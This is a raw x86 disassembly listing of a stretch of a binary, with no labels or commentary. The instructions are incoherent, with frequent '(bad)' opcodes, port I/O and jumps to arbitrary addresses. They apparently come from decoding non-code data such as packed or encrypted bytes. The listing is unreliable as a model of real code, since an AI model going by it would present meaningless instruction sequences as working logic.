  401a17:	xchg   esp,ecx
  401a19:	cwde   
  401a1a:	pop    es
  401a1b:	(bad)  
  401a1c:	rcl    DWORD PTR ds:0xd0b05ebc,cl
  401a22:	and    eax,0xb51d5c84
  401a27:	push   esi
  401a28:	retf   
  401a29:	ins    BYTE PTR es:[edi],dx
  401a2a:	pop    ebp
  401a2b:	jge    0x4019cd
  401a2d:	loop   0x401a8e
  401a2f:	and    edx,DWORD PTR [edi]
  401a31:	enter  0xaf7b,0xcc
  401a35:	fs push 0xffffffd7
  401a38:	js     0x401a09
  401a3a:	xchg   DWORD PTR [ebx+0x5],edx
  401a3d:	cli    
  401a3e:	stos   DWORD PTR es:[edi],eax
  401a3f:	fiadd  WORD PTR [esi-0x5bd9a6d2]
  401a45:	imul   esp,DWORD PTR [ecx-0x80],0xffffff85
  401a49:	push   DWORD PTR ds:[eax-0x36a6534]
  401a50:	jg     0x4019e8
  401a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a53:	cmp    al,0x49
  401a55:	aad    0xb1
  401a57:	or     al,0x9b
  401a59:	fs std 
  401a5b:	cdq    
  401a5c:	cdq    
  401a5d:	cmp    bh,BYTE PTR ds:0xbef9c488
  401a64:	jae    0x401a6f
  401a66:	fidiv  WORD PTR [eax-0x4f4aada1]
  401a6c:	mov    cl,0x81
  401a6e:	sbb    edi,DWORD PTR [eax-0x2f97ec34]
  401a74:	scas   al,BYTE PTR es:[edi]
  401a75:	(bad)  
  401a76:	mov    cl,0x49
  401a78:	sub    al,0x10
  401a7a:	je     0x401a8f
  401a7c:	xchg   edi,eax
  401a7d:	sub    DWORD PTR [ecx+0x61],ecx
  401a80:	les    eax,FWORD PTR [edi+0x1fe15faf]
  401a86:	in     al,dx
  401a87:	out    dx,eax
  401a88:	loope  0x401a87
  401a8a:	pop    DWORD PTR [ecx+0x2b08f871]
  401a90:	xchg   ecx,eax
  401a91:	les    esi,FWORD PTR [edx-0x754334ca]
  401a97:	jmp    0x401a49
  401a99:	(bad)  
  401a9a:	push   esp
  401a9b:	out    dx,al
  401a9c:	cmp    BYTE PTR [esi],ah
  401a9e:	jb     0x401b0e
  401aa0:	dec    ebp
  401aa1:	test   DWORD PTR [ebx-0x29],0xb4e93840
  401aa8:	sbb    eax,ebx
  401aaa:	xor    esp,DWORD PTR [edx+0x36ecb8a5]
  401ab0:	loope  0x401abc
  401ab2:	or     BYTE PTR [ebx-0x7b],al
  401ab5:	jnp    0x401a7c
  401ab7:	add    BYTE PTR [edi-0x12d3a675],ch
  401abd:	shl    DWORD PTR [eax],0xa5
  401ac0:	xor    al,0xc1
  401ac2:	mov    esi,0xfe5f3c34
  401ac7:	mov    ?,WORD PTR ds:0x91d6055
  401acd:	int3   
  401ace:	test   DWORD PTR [ebp-0x485f1579],ecx
  401ad4:	hlt    
  401ad5:	shr    DWORD PTR [esi-0x163a1ce8],1
  401adb:	jle    0x401b55
  401add:	gs jmp 0x401a7a
  401ae0:	jb     0x401a8b
  401ae2:	rcl    DWORD PTR [edi+eiz*1],1
  401ae5:	cmp    BYTE PTR [esi],0x7d
  401ae8:	adc    BYTE PTR [edi],cl
  401aea:	sub    bh,bh
  401aec:	jns    0x401ac5
  401aee:	lods   al,BYTE PTR ds:[esi]
  401aef:	jecxz  0x401abe
  401af1:	or     eax,0x9e356736
  401af6:	push   ecx
  401af7:	xor    bh,BYTE PTR [ebp+0x215105de]
  401afd:	xchg   ebx,eax
  401afe:	xor    cl,bl
  401b00:	inc    eax
  401b01:	lahf   
  401b02:	adc    DWORD PTR [ebx],0x1739c2eb
  401b08:	xchg   ebx,eax
  401b09:	lods   al,BYTE PTR ds:[esi]
  401b0a:	loop   0x401b3c
  401b0c:	int    0x61
  401b0e:	and    dh,BYTE PTR [edx+0x79e53d55]
  401b14:	or     al,0x2f
  401b16:	xor    DWORD PTR [ebp-0x293d0aa4],esi
  401b1c:	sahf   
  401b1d:	jns    0x401aa6
  401b1f:	shr    bl,0x6e
  401b22:	(bad)  
  401b23:	xchg   esi,eax
  401b24:	jmp    0x3a2bad59
  401b29:	push   cs
  401b2a:	xor    ch,0xe9
  401b2d:	mov    ecx,0x3c2f7ca
  401b32:	xor    al,0x99
  401b34:	add    DWORD PTR [eax-0x56],edi
  401b37:	(bad)  
  401b38:	jnp    0x401b6b
  401b3a:	add    DWORD PTR [ebp+0x61],0x4d
  401b3e:	sub    bh,BYTE PTR [esi-0x370e4b4c]
  401b44:	mov    esp,DWORD PTR [ecx]
  401b46:	mov    eax,0xbd6d1683
  401b4b:	cli    
  401b4c:	jo     0x401b4f
  401b4e:	pop    ebp
  401b4f:	sbb    ah,bl
  401b51:	xor    DWORD PTR [eax+0x6e],edi
  401b54:	loopne 0x401b36
  401b56:	pop    ebx
  401b57:	xchg   DWORD PTR [eax],edi
  401b59:	lods   al,BYTE PTR ds:[esi]
  401b5a:	jecxz  0x401b21
  401b5c:	mov    ch,0xf7
  401b5e:	xor    BYTE PTR [esi+0x6c],ch
  401b61:	xor    eax,DWORD PTR [eax+edx*8]
  401b64:	dec    esi
  401b65:	(bad)  
  401b67:	jns    0x401be0
  401b69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b6a:	add    esi,0xc9846304
  401b70:	aad    0xb0
  401b72:	xchg   edi,eax
  401b73:	dec    ebp
  401b74:	cwde   
  401b75:	rol    DWORD PTR ds:[bx+di+0x7ed2],cl
  401b7b:	fxch   st(3)
  401b7d:	adc    eax,eax
  401b7f:	test   eax,0x83460aab
  401b84:	fcomp  DWORD PTR [edi+eax*1+0x4e]
  401b88:	int3   
  401b89:	jne    0x401b5c
  401b8b:	(bad)  
  401b8c:	shl    cl,cl
  401b8e:	xor    al,dl
  401b90:	push   es
  401b91:	shr    DWORD PTR [edi+ebp*1],1
  401b94:	pop    ebp
  401b95:	adc    eax,0x506a52b6
  401b9a:	ins    DWORD PTR es:[edi],dx
  401b9b:	sub    eax,0x69f9ad59
  401ba0:	shl    BYTE PTR [eax],cl
  401ba2:	sbb    BYTE PTR [ecx+ebx*8],0xaa
  401ba6:	add    al,0xbb
  401ba8:	push   eax
  401ba9:	dec    edi
  401baa:	enter  0x7262,0x7f
  401bae:	xacquire xchg BYTE PTR [ebx+ebx*2+0x300671b],bh
  401bb6:	or     BYTE PTR [ecx-0x57],0xf6
  401bba:	lahf   
  401bbb:	pop    ecx
  401bbc:	mov    ecx,0x2387d089
  401bc1:	aaa    
  401bc2:	addr16 inc edi
  401bc4:	sahf   
  401bc5:	addr16 pushf 
  401bc7:	pop    esi
  401bc8:	add    DWORD PTR [ebx+0x7f],0xffffff9b
  401bcc:	adc    ch,BYTE PTR [edx+0x57]
  401bcf:	sbb    BYTE PTR [ebp-0x53],bl
  401bd2:	mul    BYTE PTR fs:[esi+0x2272a671]
  401bd9:	outs   dx,DWORD PTR ds:[si]
  401bdb:	push   cs
  401bdc:	jae    0x401bf0
  401bde:	outs   dx,BYTE PTR ds:[esi]
  401bdf:	push   0xffffffa9
  401be1:	mov    al,0xd7
  401be3:	jae    0x401bee
  401be5:	jns    0x401b99
  401be7:	stos   BYTE PTR es:[edi],al
  401be8:	inc    edi
  401be9:	mov    dl,0x50
  401beb:	mov    bl,0x87
  401bed:	push   0x75
  401bef:	jecxz  0x401ba8
  401bf1:	push   0xffffffa8
  401bf3:	xchg   esi,eax
  401bf4:	mov    eax,0xb68eea23
  401bf9:	cld    
  401bfa:	cmp    edx,edi
  401bfc:	(bad)  
  401bfd:	mul    BYTE PTR [eax-0x60]
  401c00:	xor    esp,DWORD PTR [edx+0x3b0ef440]
  401c06:	cmp    eax,0x17976c9d
  401c0b:	xchg   ecx,eax
  401c0c:	adc    cl,ah
  401c0e:	sbb    eax,0x15d1b03c
  401c13:	cmp    DWORD PTR [ebx+0x56],edi
  401c16:	cs dec eax
  401c18:	cld    
  401c19:	xlat   BYTE PTR ds:[ebx]
  401c1a:	lods   al,BYTE PTR ds:[esi]
  401c1b:	or     DWORD PTR [edx],esi
  401c1d:	push   eax
  401c1e:	out    0x3f,eax
  401c20:	jnp    0x401c68
  401c22:	adc    DWORD PTR [esi-0x6d],0xa1d73e10
  401c29:	push   edi
  401c2a:	loopne 0x401bff
  401c2c:	adc    dh,bh
  401c2e:	add    BYTE PTR [edi],0x5f
  401c31:	jmp    0x4fc54d52
  401c36:	cmp    eax,0xdb8c9c50
  401c3b:	outs   dx,BYTE PTR ds:[esi]
  401c3c:	in     al,dx
  401c3d:	call   0x383a192c
  401c42:	mov    ah,0xdb
  401c44:	pop    eax
  401c45:	sti    
  401c46:	mul    BYTE PTR [ecx-0x4c068bd2]
  401c4c:	push   eax
  401c4d:	leave  
  401c4e:	or     ch,BYTE PTR [edi]
  401c50:	in     eax,0x8b
  401c52:	outs   dx,DWORD PTR ds:[esi]
  401c53:	js     0x401c4b
  401c55:	es je  0x401c36
  401c58:	cmp    DWORD PTR [ebx-0x7c],edx
  401c5b:	or     edi,DWORD PTR [ebp-0x7c32f5fb]
  401c61:	pop    ss
  401c62:	fisub  WORD PTR [ebp+0x76fe88b7]
  401c68:	ja     0x401c6c
  401c6a:	jle    0x401c9d
  401c6c:	push   cs
  401c6d:	mov    esp,0xb8656ae8
  401c72:	fnstenv [edx]
  401c74:	and    DWORD PTR es:[edx*1-0x3476d409],ebp
  401c7c:	push   edx
  401c7d:	stos   DWORD PTR es:[edi],eax
  401c7e:	call   0x570a:0x48ec7da8
  401c85:	pop    ebx
  401c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c87:	cs test eax,0xdedbc307
  401c8d:	fsubp  st(5),st
  401c8f:	div    BYTE PTR [ecx]
  401c91:	mov    WORD PTR [ecx+0x18c54f2d],?
  401c97:	add    eax,0xd99f9ea7
  401c9c:	aam    0xf6
  401c9e:	out    0x7a,al
  401ca0:	daa    
  401ca1:	outs   dx,BYTE PTR gs:[esi]
  401ca3:	jo     0x401cb1
  401ca5:	test   eax,0xf2d751ac
  401caa:	xor    dh,BYTE PTR [eax*2+0x6796179f]
  401cb1:	push   esi
  401cb2:	test   DWORD PTR [ebx+edi*1+0x2a],esp
  401cb6:	jmp    0xd6e297f
  401cbb:	pop    edx
  401cbc:	shl    BYTE PTR [ecx],1
  401cbe:	pop    ecx
  401cbf:	loopne 0x401ce8
  401cc1:	adc    esp,DWORD PTR [ecx+eiz*8+0x451dfcf5]
  401cc8:	movups xmm2,XMMWORD PTR [edi+ebx*8]
  401ccc:	pop    ss
  401ccd:	xchg   edi,eax
  401cce:	cmp    dl,al
  401cd0:	xchg   DWORD PTR [ecx-0x2b],eax
  401cd3:	mov    dl,0xea
  401cd5:	test   al,0x65
  401cd7:	(bad)  
  401cd8:	and    al,0xe5
  401cda:	push   ebx
  401cdb:	cmp    eax,0x9cb7c0cd
  401ce0:	leave  
  401ce1:	sbb    eax,DWORD PTR [edi-0x54e73671]
  401ce7:	aas    
  401ce8:	not    DWORD PTR [eax-0x448ddcdf]
  401cee:	push   ebp
  401cef:	pop    esp
  401cf0:	cmp    BYTE PTR [ebx-0x5d],al
  401cf3:	dec    ecx
  401cf4:	xchg   ebp,eax
  401cf5:	aad    0xaf
  401cf7:	(bad)  
  401cf8:	stc    
  401cf9:	mov    WORD PTR [ebp-0x25c1242a],cs
  401cff:	mov    ?,WORD PTR [ecx-0x3]
  401d02:	sbb    ebp,DWORD PTR [ecx-0x714b955b]
  401d08:	stos   BYTE PTR es:[edi],al
  401d09:	es push ss
  401d0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d0c:	out    0xdd,al
  401d0e:	sar    dl,1
  401d10:	jbe    0x401cb0
  401d12:	add    ch,al
  401d14:	jle    0x401ca2
  401d16:	repz or ah,BYTE PTR ss:[ebx]
  401d1a:	out    dx,eax
  401d1b:	enter  0xeed9,0xbd
  401d1f:	add    al,0x6b
  401d21:	cmp    BYTE PTR [eax],ah
  401d23:	xor    bh,cl
  401d25:	jae    0x401da2
  401d27:	jp     0x401d11
  401d29:	adc    ebp,DWORD PTR [esi]
  401d2b:	jl     0x401d0a
  401d2d:	pop    es
  401d2e:	xchg   DWORD PTR [edx+0x56],ebp
  401d31:	xor    ah,dl
  401d33:	xor    DWORD PTR [ebx+0x6de68ebd],0x3fc3da00
  401d3d:	xchg   ecx,eax
  401d3e:	test   eax,0x1dd3955f
  401d43:	cmp    dl,ah
  401d45:	xchg   edx,ebx
  401d47:	ja     0x401d55
  401d49:	mov    esp,0xf65b04ee
  401d4e:	push   0x7b7ac4f7
  401d53:	(bad)  
  401d54:	imul   esp,DWORD PTR [ecx+0x71425f83],0xffffffcb
  401d5b:	(bad)  
  401d5c:	scas   al,BYTE PTR es:[edi]
  401d5d:	and    DWORD PTR [ebp-0x399c2e88],esp
  401d63:	pop    ss
  401d64:	mov    edx,DWORD PTR [ebx*1-0x7cc9a191]
  401d6b:	mov    ebp,0x34f65039
  401d70:	sub    edx,DWORD PTR [ecx-0x7af67774]
  401d76:	mov    bl,0xf7
  401d78:	jno    0x401dd8
  401d7a:	sbb    dl,BYTE PTR [ecx-0x75]
  401d7d:	lods   eax,DWORD PTR ds:[esi]
  401d7e:	popf   
  401d7f:	ja     0x401d6f
  401d81:	pop    edi
  401d82:	push   cs
  401d83:	out    0x7b,al
  401d85:	ss adc al,0xc2
  401d88:	or     ebp,DWORD PTR [eax]
  401d8a:	and    dl,bl
  401d8c:	or     eax,0x3a34fd4
  401d91:	sbb    dh,dh
  401d93:	(bad)  
  401d94:	(bad)  
  401d95:	sub    BYTE PTR [ebx+0x26],dh
  401d98:	push   0x7d
  401d9a:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  401d9c:	and    bl,al
  401d9e:	xlat   BYTE PTR ds:[ebx]
  401d9f:	or     ecx,ebx
  401da1:	dec    ecx
  401da2:	xchg   ebx,eax
  401da3:	push   0xffffffe8
  401da5:	btc    DWORD PTR [esi],ebx
  401da8:	stos   BYTE PTR es:[edi],al
  401da9:	(bad)  
  401daa:	lock dec edi
  401dac:	in     eax,0xe0
  401dae:	idiv   DWORD PTR [esp+edi*8-0x195d9565]
  401db5:	mov    al,BYTE PTR [eiz*2+0x5147b9be]
  401dbc:	xor    al,0x5f
  401dbe:	push   es
  401dbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dc0:	sub    bl,BYTE PTR [esi*2-0x27d6f735]
  401dc7:	aam    0x43
  401dc9:	xor    dl,dh
  401dcb:	push   esi
  401dcc:	adc    esp,eax
  401dce:	cli    
  401dcf:	sar    eax,0xa7
  401dd2:	(bad)  
  401dd4:	sbb    al,0xd
  401dd6:	enter  0x434b,0xe
  401dda:	adc    esp,DWORD PTR [ebx+0x23]
  401ddd:	dec    esi
  401dde:	je     0x401d93
  401de0:	outs   dx,DWORD PTR ds:[esi]
  401de1:	aas    
  401de2:	xor    edx,DWORD PTR [esi-0x64]
  401de5:	bound  ebx,QWORD PTR [edi+0x621e4834]
  401deb:	loop   0x401dd9
  401ded:	cs jl  0x401de8
  401df0:	dec    esp
  401df1:	retf   0x213f
  401df4:	push   eax
  401df5:	scas   eax,DWORD PTR es:[edi]
  401df6:	jnp    0x401dcc
  401df8:	xchg   edi,eax
  401df9:	(bad)  
  401dfa:	mov    edi,esi
  401dfc:	fwait
  401dfd:	addr16 jg 0x401da7
  401e00:	xchg   edx,eax
  401e01:	neg    esi
  401e03:	mov    bl,BYTE PTR [esi]
  401e05:	xchg   edx,eax
  401e06:	js     0x401da5
  401e08:	sbb    eax,0x9bdbbcf5
  401e0d:	fld1   
  401e0f:	in     eax,0x19
  401e11:	cwde   
  401e12:	in     eax,0x9
  401e14:	adc    bl,0xce
  401e17:	and    ebx,DWORD PTR [eax+0x6d19088b]
  401e1d:	push   ebp
  401e1e:	sti    
  401e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e20:	cmp    DWORD PTR [ebx*4+0x7677f771],eax
  401e27:	push   0xb78ec780
  401e2c:	out    dx,al
  401e2d:	mov    dh,0xb1
  401e2f:	xor    BYTE PTR [eax],al
  401e31:	(bad)  
  401e33:	leave  
  401e34:	lsl    esp,bx
  401e37:	sti    
  401e38:	bound  edi,QWORD PTR [eax+0xcd0e752]
  401e3e:	aad    0xf6
  401e40:	lods   al,BYTE PTR ds:[esi]
  401e41:	dec    ebp
  401e42:	xor    eax,DWORD PTR [eax]
  401e44:	mov    dl,0x26
  401e46:	(bad)  
  401e47:	test   eax,0x1496cf9a
  401e4c:	mov    WORD PTR [eax-0x5],di
  401e50:	retf   0x2c41
  401e53:	out    dx,al
  401e54:	fisttp QWORD PTR [ebx]
  401e56:	jl     0x401ecc
  401e58:	aaa    
  401e59:	xchg   esi,eax
  401e5a:	test   dh,dh
  401e5c:	js     0x401e02
  401e5e:	aas    
  401e5f:	cmovp  esi,eax
  401e62:	xor    ch,BYTE PTR [eax-0x5c]
  401e65:	enter  0x1b2d,0x2
  401e69:	fs mov ebx,0x92165651
  401e6f:	clc    
  401e70:	loope  0x401e34
  401e72:	fmul   QWORD PTR [ebp+0x15]
  401e75:	loop   0x401e39
  401e77:	push   esi
  401e78:	xor    ebp,esi
  401e7a:	xor    DWORD PTR ds:0x47d965f4,edx
  401e80:	dec    ecx
  401e81:	cli    
  401e82:	shl    cl,0x20
  401e85:	(bad)  
  401e86:	pop    esi
  401e87:	or     al,0xd1
  401e89:	mov    ebx,0x3a73a32
  401e8e:	push   ebx
  401e8f:	aas    
  401e90:	or     BYTE PTR [esi+0x72],cl
  401e93:	icebp  
  401e94:	fcom   QWORD PTR [esi+0x19]
  401e97:	sahf   
  401e98:	sub    BYTE PTR [ecx],0xc
  401e9b:	xchg   ebp,eax
  401e9c:	ins    DWORD PTR es:[edi],dx
  401e9d:	test   eax,0x29b0a5e8
  401ea2:	aad    0x4b
  401ea4:	jno    0x401ebb
  401ea6:	leave  
  401ea7:	xchg   BYTE PTR [edx-0x3f],bl
  401eaa:	jo     0x401eb3
  401eac:	scas   eax,DWORD PTR es:[edi]
  401ead:	das    
  401eae:	pop    esp
  401eaf:	call   0x725a465d
  401eb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401eb5:	or     eax,0x7d3c64d6
  401eba:	push   edi
  401ebb:	dec    ecx
  401ebc:	sub    DWORD PTR [eax+ebp*1-0x1f],0xc74808d7
  401ec4:	pop    esp
  401ec5:	mov    BYTE PTR [ebp+0x623cce8e],bh
  401ecb:	or     ah,BYTE PTR [ebx]
  401ecd:	sub    edi,DWORD PTR [edi-0x42]
  401ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ed1:	(bad)  
  401ed2:	loopne 0x401e86
  401ed4:	pcmpeqb mm3,QWORD PTR [ebp+ecx*4-0x3f3a267]
  401edc:	inc    eax
  401edd:	dec    esi
  401ede:	add    bh,bl
  401ee0:	sbb    al,0xb0
  401ee2:	shr    DWORD PTR [ecx+0x28],cl
  401ee5:	lods   al,BYTE PTR ds:[esi]
  401ee6:	xchg   DWORD PTR [edi-0x1c],edx
  401ee9:	in     eax,0xc2
  401eeb:	push   esi
  401eec:	sti    
  401eed:	fdiv   QWORD PTR [ebx+edx*2]
  401ef0:	fiadd  WORD PTR [eax]
  401ef2:	fs cwde 
  401ef4:	retf   0x959
  401ef7:	xor    BYTE PTR [esi+ebx*8-0x6f39ad80],dl
  401efe:	mov    es,WORD PTR [edi-0x5a]
  401f01:	mov    ebp,0x3c135f4d
  401f06:	or     DWORD PTR [esi-0x35],edx
  401f09:	fisttp WORD PTR ds:0x5eabdd60
  401f0f:	(bad)  
  401f11:	mov    ch,0xab
  401f13:	repz cmp DWORD PTR [ecx+0x7bcc3adf],edi
  401f1a:	pop    esp
  401f1b:	mov    DWORD PTR [edi+0x7f],ecx
  401f1e:	mov    dh,0x2a
  401f20:	inc    esp
  401f21:	jp     0x401f8f
  401f23:	in     eax,dx
  401f24:	(bad)
  401f28:	mov    bh,0x1e
  401f2a:	xchg   BYTE PTR [ebp-0x74],cl
  401f2d:	fld    TBYTE PTR [esi-0x4484d256]
  401f33:	test   DWORD PTR [eax+0x31ad734b],esp
  401f39:	push   0x62
  401f3b:	mov    eax,ss:0xedd8fa4a
  401f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f43:	sbb    DWORD PTR [esi-0x435e48d7],esi
  401f49:	adc    dl,ch
  401f4b:	sub    ch,al
  401f4d:	popa   
  401f4e:	mov    al,0x4c
  401f50:	mov    ebp,0xed8de692
  401f55:	mov    eax,ds:0x92e86825
  401f5a:	or     al,0x26
  401f5c:	pop    es
  401f5d:	add    al,BYTE PTR [esi-0x271f2a76]
  401f63:	fistp  DWORD PTR [esi]
  401f65:	push   ss
  401f66:	adc    ebx,edi
  401f68:	(bad)  
  401f69:	in     eax,0x7f
  401f6b:	cli    
  401f6c:	loop   0x401f4c
  401f6e:	jge    0x401f55
  401f70:	mov    WORD PTR [ebx],gs
  401f72:	out    dx,al
  401f73:	stc    
  401f74:	outs   dx,DWORD PTR ds:[esi]
  401f75:	and    cl,al
  401f77:	sbb    edx,DWORD PTR [edi]
  401f79:	imul   esp,DWORD PTR [ecx],0xebe6fc13
  401f7f:	pushf  
  401f80:	fisttp QWORD PTR [edx-0x6075d0da]
  401f86:	mov    eax,ds:0x4da7b3b4
  401f8b:	lahf   
  401f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f8d:	mov    cl,0xc2
  401f8f:	ins    DWORD PTR es:[edi],dx
  401f90:	aam    0xd9
  401f92:	and    BYTE PTR [edi+0x24],dh
  401f95:	(bad)  
  401f96:	int    0xf4
  401f98:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  401f9a:	add    dh,bl
  401f9c:	aam    0xfb
  401f9e:	and    eax,0x25314acc
  401fa3:	jbe    0x401fd0
  401fa5:	les    ecx,FWORD PTR [ecx+0x2e]
  401fa8:	and    al,0xcd
  401faa:	mov    ds:0x226a2adb,al
  401faf:	dec    edx
  401fb0:	(bad)  [ebp-0x5a]
  401fb3:	sub    BYTE PTR [edi],0xbf
  401fb6:	test   BYTE PTR [eax-0x66],dl
  401fb9:	leave  
  401fba:	je     0x40202e
  401fbc:	xchg   ebp,eax
  401fbd:	inc    esi
  401fbe:	pop    esp
  401fbf:	push   ss
  401fc0:	inc    edx
  401fc1:	or     DWORD PTR [edx-0x21],edi
  401fc4:	mov    ds:0xe8c1db8d,eax
  401fc9:	popf   
  401fca:	jns    0x40203e
  401fcc:	mov    esi,0x2a84c3b5
  401fd1:	pop    edi
  401fd2:	leave  
  401fd3:	mov    DWORD PTR [eax+ebx*1+0x65841084],esp
  401fda:	jb     0x402049
  401fdc:	(bad)  
  401fdd:	sub    al,0x8e
  401fdf:	sbb    DWORD PTR [edx+0x4d],ecx
  401fe2:	or     ebp,edi
  401fe4:	xchg   edi,eax
  401fe5:	das    
  401fe6:	push   0xe3a2914e
  401feb:	push   edx
  401fec:	mov    edx,0x906a7df7
  401ff1:	sub    edi,DWORD PTR [edi]
  401ff3:	cmc    
  401ff4:	not    DWORD PTR [edi+eiz*2+0x293f791c]
  401ffb:	sub    DWORD PTR [esi-0x141991af],edi
  402001:	mov    dl,0x40
  402003:	mov    bh,0x1d
  402005:	lock inc esp
  402007:	leave  
  402008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402009:	dec    edi
  40200a:	stos   BYTE PTR es:[edi],al
  40200b:	pop    es
  40200c:	and    al,0xba
  40200e:	(bad)  
  40200f:	adc    bl,BYTE PTR [ecx]
  402011:	nop
  402012:	(bad)  
  402014:	punpckhbw mm5,QWORD PTR [esi+0x57f03eec]
  40201b:	push   edx
  40201c:	xor    edx,esi
  40201e:	push   ebp
  40201f:	pop    ebp
  402020:	rcr    esp,0xb3
  402023:	and    al,al
  402025:	outs   dx,BYTE PTR ds:[esi]
  402026:	retf   0x25e6
  402029:	imul   ecx,esp,0xfbf211fb
  40202f:	(bad)  
  402031:	sub    BYTE PTR [eax-0x41],0x34
  402035:	mov    edi,0xe5b4def4
  40203a:	mov    WORD PTR [ebx-0x4777230f],es
  402040:	or     ch,BYTE PTR [edi+0x626b9e68]
  402046:	iret   
  402047:	xor    cl,BYTE PTR [ecx]
  402049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40204a:	push   esp
  40204b:	mov    cl,0x9a
  40204d:	jp     0x40209f
  40204f:	adc    al,dl
  402051:	aas    
  402052:	mov    edx,0xd35e32fc
  402057:	xchg   ebx,eax
  402058:	inc    ecx
  402059:	push   edx
  40205a:	push   esp
  40205b:	(bad)  
  40205c:	je     0x4020c7
  40205e:	add    ch,BYTE PTR [esi]
  402060:	(bad)  
  402061:	out    dx,eax
  402062:	aas    
  402063:	jno    0x401fe6
  402065:	sar    BYTE PTR [esi+0x5d],cl
  402068:	and    BYTE PTR [esi+0x18],dh
  40206b:	sbb    edi,DWORD PTR [ecx]
  40206d:	in     al,0x7f
  40206f:	cwde   
  402070:	sbb    BYTE PTR [ecx+edx*8-0x33],bh
  402074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402075:	addr16 inc edi
  402077:	jno    0x402097
  402079:	ss dec eax
  40207b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40207c:	loope  0x4020b8
  40207e:	or     ecx,ebp
  402080:	sub    BYTE PTR [esp+ebx*8-0x79],0x48
  402085:	xor    DWORD PTR [ebx-0x35524801],eax
  40208b:	xchg   ecx,eax
  40208c:	retf   0xd78d
  40208f:	push   eax
  402090:	and    ebx,DWORD PTR [eax+eiz*8+0x79]
  402094:	add    ebp,esp
  402096:	push   ds
  402097:	ror    DWORD PTR [eax-0x7d55e6d2],1
  40209d:	rol    DWORD PTR [ebp-0x6d5e4159],1
  4020a3:	cmp    eax,0x6d4be21b
  4020a8:	not    DWORD PTR [ebx]
  4020aa:	mov    ebp,0x67a5480e
  4020af:	cs scas eax,DWORD PTR es:[edi]
  4020b1:	jne    0x40204a
  4020b3:	scas   al,BYTE PTR es:[edi]
  4020b4:	dec    eax
  4020b5:	jecxz  0x4020a1
  4020b7:	pop    esi
  4020b8:	sbb    al,0xc5
  4020ba:	fdiv   QWORD PTR [ecx+eiz*4+0x33]
  4020be:	ins    BYTE PTR es:[edi],dx
  4020bf:	xchg   BYTE PTR [ecx-0x1ed02874],ah
  4020c5:	pushw  0x99d
  4020c9:	xchg   edi,eax
  4020ca:	pushf  
  4020cb:	aad    0xc6
  4020cd:	cmp    eax,0x97d10adf
  4020d2:	rcr    ebx,cl
  4020d4:	into   
  4020d5:	or     bh,BYTE PTR [ecx]
  4020d7:	pop    eax
  4020d8:	fcomp  DWORD PTR [esi+0x79]
  4020db:	fimul  WORD PTR [esi-0x1e]
  4020de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020df:	fsub   DWORD PTR [ebx-0xe]
  4020e2:	xor    BYTE PTR [edx],al
  4020e4:	sbb    eax,0x37660f83
  4020e9:	cld    
  4020ea:	icebp  
  4020eb:	jle    0x40207b
  4020ed:	dec    edi
  4020ee:	stos   DWORD PTR es:[edi],eax
  4020ef:	lea    eax,[edx-0x39]
  4020f2:	push   ebp
  4020f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020f4:	jmp    0x9b2e:0x2c350e9a
  4020fb:	int    0x7e
  4020fd:	test   cl,bh
  4020ff:	or     DWORD PTR ds:0x5f20420f,esp
  402105:	push   0xdcef1ade
  40210a:	and    BYTE PTR [eax+0x11],cl
  40210d:	sbb    eax,0xd804b67c
  402112:	mov    edx,0x58c91471
  402117:	xchg   BYTE PTR [eax+0x2f54997d],bh
  40211d:	cmp    cl,dh
  40211f:	fsubr  QWORD PTR [edi+eiz*1-0x5f19b91]
  402126:	add    al,0x8a
  402128:	adc    BYTE PTR [esi-0x3deee6b2],bl
  40212e:	lock (bad) 
  402131:	fdiv   QWORD PTR [ebx]
  402133:	test   eax,0x355ba546
  402138:	test   esp,edi
  40213a:	popa   
  40213b:	(bad)  
  40213c:	mov    dl,0x96
  40213e:	pop    ecx
  40213f:	and    al,0x8
  402141:	mov    bl,0xbc
  402143:	gs sub al,0x8b
  402146:	or     ah,BYTE PTR [edi+0x3230f85c]
  40214c:	pop    ds
  40214d:	popf   
  40214e:	scas   al,BYTE PTR es:[edi]
  40214f:	or     eax,0x9dc36695
  402154:	xor    eax,0x5e39d13
  402159:	push   esi
  40215a:	ss jge 0x4021d3
  40215d:	cld    
  40215e:	out    0xa,eax
  402160:	pop    ebp
  402161:	jmp    0x402196
  402163:	xchg   edx,eax
  402164:	sbb    eax,0xc61104e3
  402169:	xchg   edi,eax
  40216a:	rcl    dh,1
  40216c:	and    ah,al
  40216e:	dec    esp
  40216f:	sbb    ebp,ebp
  402171:	cld    
  402172:	push   0xee1a4fac
  402177:	mov    bh,0x94
  402179:	sbb    ecx,DWORD PTR [ebx+0x3436400e]
  40217f:	mov    edi,0x65094005
  402184:	clc    
  402185:	and    bl,BYTE PTR [edi-0x34]
  402188:	pop    edi
  402189:	cmp    eax,0xda2ea02f
  40218e:	pushf  
  40218f:	imul   ebp,DWORD PTR [ebx-0x11],0x827b6455
  402196:	in     al,dx
  402197:	fldenv [ebp-0x35]
  40219a:	fld    DWORD PTR [edi-0x75]
  40219d:	pop    ss
  40219e:	int    0xbc
  4021a0:	inc    esp
  4021a1:	inc    edx
  4021a2:	out    dx,al
  4021a3:	data16 in al,dx
  4021a5:	bswap  ecx
  4021a7:	dec    edi
  4021a8:	mov    al,ah
  4021aa:	dec    esi
  4021ab:	call   0xc51d:0xec7c78a
  4021b2:	clc    
  4021b3:	cmp    dl,cl
  4021b5:	mov    dh,0xd5
